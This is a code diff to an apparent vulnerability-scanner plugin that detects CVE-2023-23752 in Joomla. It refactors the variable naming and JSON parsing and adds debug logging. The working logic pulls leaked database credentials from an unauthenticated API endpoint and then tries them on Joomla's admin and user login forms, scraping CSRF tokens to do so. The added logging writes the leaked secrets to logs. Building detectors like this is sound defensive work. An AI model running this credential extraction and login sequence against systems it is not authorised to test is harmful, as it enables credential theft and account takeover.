@@ -23,6 +23,10 @@ import static com.google.tsunami.common.net.http.HttpRequest.get;
 import com.google.common.annotations.VisibleForTesting;
 import com.google.common.collect.ImmutableList;
 import com.google.common.flogger.GoogleLogger;
+import com.google.gson.JsonArray;
+import com.google.gson.JsonObject;
+import com.google.gson.JsonPrimitive;
+import com.google.gson.JsonSyntaxException;
 import com.google.protobuf.util.Timestamps;
 import com.google.tsunami.common.data.NetworkServiceUtils;
 import com.google.tsunami.common.net.http.HttpClient;
@@ -50,12 +54,10 @@ import java.net.MalformedURLException;
 import java.net.URI;
 import java.net.URL;
 import java.net.UnknownHostException;
-import java.net.http.HttpClient.Redirect;
 import java.net.http.HttpRequest;
 import java.time.Clock;
 import java.time.Duration;
 import java.time.Instant;
-import java.util.Objects;
 import java.util.regex.Matcher;
 import java.util.regex.Pattern;
 import javax.inject.Inject;
@@ -80,8 +82,6 @@ public final class Cve202323752VulnDetector implements VulnDetector {
 
   @VisibleForTesting static final String DETECTION_STRING_1 = "password";
   @VisibleForTesting static final String DETECTION_STRING_2 = "user";
-  @VisibleForTesting static final String DETECTION_STRING_BY_HEADER_1 = "application/json";
-  @VisibleForTesting static final String DETECTION_STRING_BY_HEADER_2 = "application/vnd.api+json";
   @VisibleForTesting static final int DETECTION_STRING_BY_STATUS = HttpStatus.OK.code();
   private final HttpClient httpClient;
   private final Clock utcClock;
@@ -106,29 +106,32 @@ public final class Cve202323752VulnDetector implements VulnDetector {
   }
 
   static final class ScanResults {
-    private String DataBaseUsername;
-    private String DataBasePassword;
-    private String DataBaseHost;
-    private boolean IsPublicDataBaseHost;
-    private boolean CompromisedAdminAccount;
-    private boolean CompromisedUserAccount;
-    private boolean IsSuccessFul;
+    private String dataBaseUsername;
+    private String dataBasePassword;
+    private String dataBaseHost;
+    private String leakedResponse;
+    private boolean isPublicDatabaseHost;
+    private boolean compromisedAdminAccount;
+    private boolean compromisedUserAccount;
+    private boolean isSuccessFul;
 
     public ScanResults(
-        String DataBaseUsername,
-        String DataBasePassword,
-        String DataBaseHost,
-        boolean IsPublicDataBaseHost,
-        boolean CompromisedAdminAccount,
-        boolean CompromisedUserAccount,
-        boolean IsSuccessFul) {
-      this.DataBaseUsername = DataBaseUsername;
-      this.DataBasePassword = DataBasePassword;
-      this.DataBaseHost = DataBaseHost;
-      this.IsPublicDataBaseHost = IsPublicDataBaseHost;
-      this.CompromisedUserAccount = CompromisedUserAccount;
-      this.CompromisedAdminAccount = CompromisedAdminAccount;
-      this.IsSuccessFul = IsSuccessFul;
+        String dataBaseUsername,
+        String dataBasePassword,
+        String dataBaseHost,
+        String leakedResponse,
+        boolean isPublicDatabaseHost,
+        boolean compromisedAdminAccount,
+        boolean compromisedUserAccount,
+        boolean isSuccessFul) {
+      this.dataBaseUsername = dataBaseUsername;
+      this.dataBasePassword = dataBasePassword;
+      this.dataBaseHost = dataBaseHost;
+      this.isPublicDatabaseHost = isPublicDatabaseHost;
+      this.compromisedUserAccount = compromisedUserAccount;
+      this.compromisedAdminAccount = compromisedAdminAccount;
+      this.isSuccessFul = isSuccessFul;
+      this.leakedResponse = leakedResponse;
     }
   }
 
@@ -142,42 +145,42 @@ public final class Cve202323752VulnDetector implements VulnDetector {
         .filter(NetworkServiceUtils::isWebService)
         .forEach(
             networkService -> {
-              ScanResults Results = isServiceVulnerable(networkService);
-              if (Results.IsSuccessFul) {
+              ScanResults results = isServiceVulnerable(networkService);
+              if (results.isSuccessFul) {
                 detectionReport.addDetectionReports(
-                    buildDetectionReport(targetInfo, networkService, Results));
+                    buildDetectionReport(targetInfo, networkService, results));
               }
             });
     return detectionReport.build();
   }
 
   private DetectionReport buildDetectionReport(
-      TargetInfo targetInfo, NetworkService vulnerableNetworkService, ScanResults Results) {
+      TargetInfo targetInfo, NetworkService vulnerableNetworkService, ScanResults results) {
     StringBuilder ScanResultReport = new StringBuilder();
     ScanResultReport.append("The leaked credentials are: \n")
         .append("Database Password:\n")
-        .append(Results.DataBasePassword)
+        .append(results.dataBasePassword)
         .append("\n")
         .append("Database UserName:\n")
-        .append(Results.DataBaseUsername)
+        .append(results.dataBaseUsername)
         .append("\n");
 
-    if (Results.IsPublicDataBaseHost) {
+    if (results.isPublicDatabaseHost) {
       ScanResultReport.append(
               "The dataBase host is Accessible to Public Because it has a public IP address, "
                   + "Attackers can leverage leaked DataBase credentials to login into your DataBase, The DataBase HostName is: ")
-          .append(Results.DataBaseHost)
+          .append(results.dataBaseHost)
           .append("\n");
     }
 
-    if (Results.CompromisedAdminAccount) {
+    if (results.compromisedAdminAccount) {
       ScanResultReport.append(
               "Scanner has checked the credentials against Administrator login page "
                   + "and Leaked credentials had used as a Joomla Administrator credentials")
           .append("\n");
     }
 
-    if (Results.CompromisedUserAccount) {
+    if (results.compromisedUserAccount) {
       ScanResultReport.append(
               "Scanner has checked the credentials against Users login page "
                   + "and Leaked credentials had used as a Joomla User credentials")
@@ -208,7 +211,7 @@ public final class Cve202323752VulnDetector implements VulnDetector {
   }
 
   private ScanResults isServiceVulnerable(NetworkService networkService) {
-    ScanResults Results = new ScanResults("", "", "", false, false, false, false);
+    ScanResults results = new ScanResults("", "", "", "", false, false, false, false);
     HttpHeaders httpHeaders =
         HttpHeaders.builder()
             .addHeader(CONTENT_TYPE, "text/plain; charset=UTF-8")
@@ -220,133 +223,140 @@ public final class Cve202323752VulnDetector implements VulnDetector {
             .addHeader(ACCEPT_ENCODING, "gzip, deflate")
             .build();
 
-    String targetVulnerabilityUrl = buildTarget(networkService).append(VULNERABLE_PATH).toString();
+    String targetUrl = buildTarget(networkService).append(VULNERABLE_PATH).toString();
     try {
       HttpResponse httpResponse =
-          httpClient.send(
-              get(targetVulnerabilityUrl).setHeaders(httpHeaders).build(), networkService);
+          httpClient.send(get(targetUrl).setHeaders(httpHeaders).build(), networkService);
 
       // immediate checks for faster scanning
       if (httpResponse.status().code() != DETECTION_STRING_BY_STATUS
+          || httpResponse.bodyJson().isEmpty()
           || httpResponse.bodyString().isEmpty()) {
-        return Results;
-      }
-
-      // check for content-type existence and get the value of them
-      String ContentTypeValue = "";
-      if (httpResponse.headers().get(CONTENT_TYPE.toLowerCase()).isPresent()) {
-        ContentTypeValue =
-            Objects.requireNonNull(httpResponse.headers().get("Content-Type").toString());
-
-      } else if (httpResponse.headers().get(CONTENT_TYPE).isPresent()) {
-        ContentTypeValue =
-            Objects.requireNonNull(httpResponse.headers().get("Content-Type").toString());
-      } else {
-        return Results;
-      }
-
-      // check for content-type header's value matches our detection rules
-      if (!ContentTypeValue.contains(DETECTION_STRING_BY_HEADER_1)
-          && !ContentTypeValue.contains(DETECTION_STRING_BY_HEADER_2)) {
-        return Results;
+        return results;
       }
 
       // check for body values match our detection rules
       // and save leaked credentials
       if (httpResponse.bodyString().get().contains(DETECTION_STRING_1)
           && httpResponse.bodyString().get().contains(DETECTION_STRING_2)) {
-        Results.IsSuccessFul = true;
+        results.isSuccessFul = true;
+        results.leakedResponse = httpResponse.bodyString().get();
 
-        JSONObject ResponseBodyJson = new JSONObject(httpResponse.bodyString().get());
-        if (ResponseBodyJson.keySet().contains("data")) {
-          JSONArray jsonArray = ResponseBodyJson.getJSONArray("data");
-          for (int i = 0; i < jsonArray.length(); i++) {
-            if (jsonArray.getJSONObject(i).keySet().contains("attributes")) {
-              JSONObject tmp =
-                  new JSONObject(jsonArray.getJSONObject(i).get("attributes").toString());
+        JsonObject jsonResponse = (JsonObject) httpResponse.bodyJson().get();
+        if (jsonResponse.keySet().contains("data")) {
+          logger.atInfo().log(
+              "\n==========================jsonResponse.getAsJsonArray(\"data\")\n"
+                  + jsonResponse.getAsJsonArray("data")
+                  + "\n==========================\n");
+          JsonArray jsonArray = jsonResponse.getAsJsonArray("data");
+          for (int i = 0; i < jsonArray.size(); i++) {
+            if (jsonArray.get(i).getAsJsonObject().keySet().contains("attributes")) {
+              JsonObject tmp =
+                  jsonArray.get(i).getAsJsonObject().get("attributes").getAsJsonObject();
+              logger.atInfo().log(
+                  "\n==========================tmp\n" + tmp + "\n==========================\n");
               if (tmp.keySet().contains(("user"))) {
-                Results.DataBaseUsername = tmp.get("user").toString();
+                results.dataBaseUsername = tmp.get("user").toString();
               }
               if (tmp.keySet().contains(("password"))) {
-                Results.DataBasePassword = tmp.get("password").toString();
+                results.dataBasePassword = tmp.get("password").toString();
               }
               if (tmp.keySet().contains(("host"))) {
-                Results.DataBaseHost = tmp.get("host").toString();
-                Results.IsPublicDataBaseHost = IsPublicHost(tmp.get("host").toString());
+                results.dataBaseHost = tmp.get("host").toString();
+                logger.atInfo().log(
+                    "\n==========================results.dataBaseHost\n"
+                        + results.dataBaseHost
+                        + "\n==========================\n");
+                results.isPublicDatabaseHost = IsPublicHost(tmp.get("host").toString());
+                logger.atInfo().log(
+                    "\n==========================results.isPublicDatabaseHost\n"
+                        + results.isPublicDatabaseHost
+                        + "\n==========================\n");
               }
             }
           }
         }
 
+        //        JSONObject ResponseBodyJson = new JSONObject(httpResponse.bodyString().get());
+        //        if (ResponseBodyJson.keySet().contains("data")) {
+        //          JSONArray jsonArray = ResponseBodyJson.getJSONArray("data");
+        //          for (int i = 0; i < jsonArray.length(); i++) {
+        //            if (jsonArray.getJSONObject(i).keySet().contains("attributes")) {
+        //              JSONObject tmp =
+        //                  new JSONObject(jsonArray.getJSONObject(i).get("attributes").toString());
+        //              if (tmp.keySet().contains(("user"))) {
+        //                results.dataBaseUsername = tmp.get("user").toString();
+        //              }
+        //              if (tmp.keySet().contains(("password"))) {
+        //                results.dataBasePassword = tmp.get("password").toString();
+        //              }
+        //              if (tmp.keySet().contains(("host"))) {
+        //                results.dataBaseHost = tmp.get("host").toString();
+        //                results.isPublicDatabaseHost = IsPublicHost(tmp.get("host").toString());
+        //              }
+        //            }
+        //          }
+        //        }
+
         // Check leaked Credentials if administrator has used them in some other entries
-        if (!Results.DataBaseUsername.isEmpty() && !Results.DataBasePassword.isEmpty()) {
-          Results.CompromisedAdminAccount =
+        if (!results.dataBaseUsername.isEmpty() && !results.dataBasePassword.isEmpty()) {
+          results.compromisedAdminAccount =
               checkJoomlaAdminsLogin(
-                  buildTarget(networkService), Results.DataBaseUsername, Results.DataBasePassword);
-          Results.CompromisedUserAccount =
+                  buildTarget(networkService), results.dataBaseUsername, results.dataBasePassword);
+          results.compromisedUserAccount =
               checkJoomlaUsersLogin(
-                  buildTarget(networkService), Results.DataBaseUsername, Results.DataBasePassword);
+                  buildTarget(networkService), results.dataBaseUsername, results.dataBasePassword);
         }
 
-        return Results;
+        return results;
       }
-    } catch (IOException | AssertionError e) {
+    } catch (JsonSyntaxException | IOException | AssertionError e) {
       logger.atWarning().withCause(e).log("Request to target %s failed", networkService);
-      return Results;
+      return results;
     } catch (InterruptedException e) {
       throw new RuntimeException(e);
     }
-    return Results;
+    return results;
   }
 
   public static boolean checkJoomlaAdminsLogin(
-      StringBuilder url, String DataBaseUsername, String DataBasePassword)
+      StringBuilder url, String dataBaseUsername, String dataBasePassword)
       throws IOException, InterruptedException {
     return checkJoomlaLogin(
         url + "administrator/",
         url + "administrator/index.php",
         "username="
-            + DataBaseUsername
+            + dataBaseUsername
             + "&passwd="
-            + DataBasePassword
+            + dataBasePassword
             + "&option=com_login&task=login",
         "Set-Cookie");
   }
 
   public static boolean checkJoomlaUsersLogin(
-      StringBuilder url, String DataBaseUsername, String DataBasePassword)
+      StringBuilder url, String dataBaseUsername, String dataBasePassword)
       throws IOException, InterruptedException {
     return checkJoomlaLogin(
         url.toString(),
         url.append("index.php").toString(),
         "username="
-            + DataBaseUsername
+            + dataBaseUsername
             + "&password="
-            + DataBasePassword
+            + dataBasePassword
             + "&Submit=&option=com_users&task=user.login",
         "joomla_user_state=logged_in;");
   }
 
   public static boolean checkJoomlaLogin(
-      String InitialUrl, String LoginUrl, String Body, String FinalResponseMatcher)
+      String initialUrl, String loginUrl, String Body, String finalResponseMatcher)
       throws IOException, InterruptedException {
 
     java.net.http.HttpClient httpClient =
         java.net.http.HttpClient.newBuilder().connectTimeout(Duration.ofSeconds(2)).build();
-    //    if (InitialUrl.contains("administrator")) {
-    //      httpClient =
-    //          java.net.http.HttpClient.newBuilder()
-    //              .connectTimeout(Duration.ofSeconds(2))
-    //              .followRedirects(Redirect.ALWAYS)
-    //              .build();
-    //    } else {
-    //      httpClient =
-    //          java.net.http.HttpClient.newBuilder().connectTimeout(Duration.ofSeconds(2)).build();
-    //    }
     HttpRequest request =
         HttpRequest.newBuilder()
             .GET()
-            .uri(URI.create(InitialUrl))
+            .uri(URI.create(initialUrl))
             .setHeader(
                 ACCEPT,
                 "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8")
@@ -359,34 +369,34 @@ public final class Cve202323752VulnDetector implements VulnDetector {
         httpClient.send(request, java.net.http.HttpResponse.BodyHandlers.ofString());
 
     // get some hidden parameter values
-    String ReturnToken = null;
-    Pattern ReturnTokenPattern =
+    String returnToken = null;
+    Pattern returnTokenPattern =
         Pattern.compile("<input type=\"hidden\" name=\"return\" value=\"(.+?)\">");
-    Matcher matcher = ReturnTokenPattern.matcher(httpResponse.body());
+    Matcher matcher = returnTokenPattern.matcher(httpResponse.body());
     if (matcher.find()) {
-      ReturnToken = matcher.group(1);
+      returnToken = matcher.group(1);
     } else return false;
 
     // get CSRF token method 1
-    String CsrfToken = null;
-    Pattern CsrfPattern = Pattern.compile("<input type=\"hidden\" name=\"(.+?)\" value=\"1\">");
-    matcher = CsrfPattern.matcher(httpResponse.body());
+    String csrfToken = null;
+    Pattern csrfPattern = Pattern.compile("<input type=\"hidden\" name=\"(.+?)\" value=\"1\">");
+    matcher = csrfPattern.matcher(httpResponse.body());
     if (matcher.find()) {
-      CsrfToken = matcher.group(1);
+      csrfToken = matcher.group(1);
     } else return false;
 
     // get PreAuth Cookies
     if (httpResponse.headers().firstValue("Set-Cookie").isEmpty()) {
       return false;
     }
-    String Cookies = httpResponse.headers().firstValue("Set-Cookie").get();
+    String cookies = httpResponse.headers().firstValue("Set-Cookie").get();
 
     request =
         HttpRequest.newBuilder()
             .POST(
                 HttpRequest.BodyPublishers.ofString(
-                    Body + "&return=" + ReturnToken + "&" + CsrfToken + "=1"))
-            .uri(URI.create(LoginUrl))
+                    Body + "&return=" + returnToken + "&" + csrfToken + "=1"))
+            .uri(URI.create(loginUrl))
             .setHeader(
                 ACCEPT,
                 "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8")
@@ -394,16 +404,16 @@ public final class Cve202323752VulnDetector implements VulnDetector {
                 "User-Agent",
                 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.5563.65 Safari/537.36")
             .setHeader("Cache-Control", "max-age=0")
-            .setHeader("Cookie", Cookies)
+            .setHeader("Cookie", cookies)
             .setHeader("Content-Type", "application/x-www-form-urlencoded")
             .build();
 
     httpResponse = httpClient.send(request, java.net.http.HttpResponse.BodyHandlers.ofString());
 
-    return httpResponse.headers().toString().contains(FinalResponseMatcher)
-        || httpResponse.headers().toString().contains(FinalResponseMatcher.toLowerCase())
-        || httpResponse.body().contains(FinalResponseMatcher)
-        || httpResponse.body().contains(FinalResponseMatcher.toLowerCase());
+    return httpResponse.headers().toString().contains(finalResponseMatcher)
+        || httpResponse.headers().toString().contains(finalResponseMatcher.toLowerCase())
+        || httpResponse.body().contains(finalResponseMatcher)
+        || httpResponse.body().contains(finalResponseMatcher.toLowerCase());
   }
 
   public static boolean IsPublicHost(String url) {
@@ -469,14 +479,3 @@ public final class Cve202323752VulnDetector implements VulnDetector {
     }
   }
 }
-
-//    // get CSRF token method 2
-//    String CsrfToken=null;
-//    Pattern CsrfPattern =
-//        Pattern.compile(
-//            "<script type=\"application/json\" class=\"joomla-script-options
-// new\">(.+)</script>");
-//    matcher = CsrfPattern.matcher(httpResponse.body());
-//    if (matcher.find()) {
-//      CsrfToken = new JSONObject(matcher.group(1)).get("csrf.token").toString();
-//     } else return false;
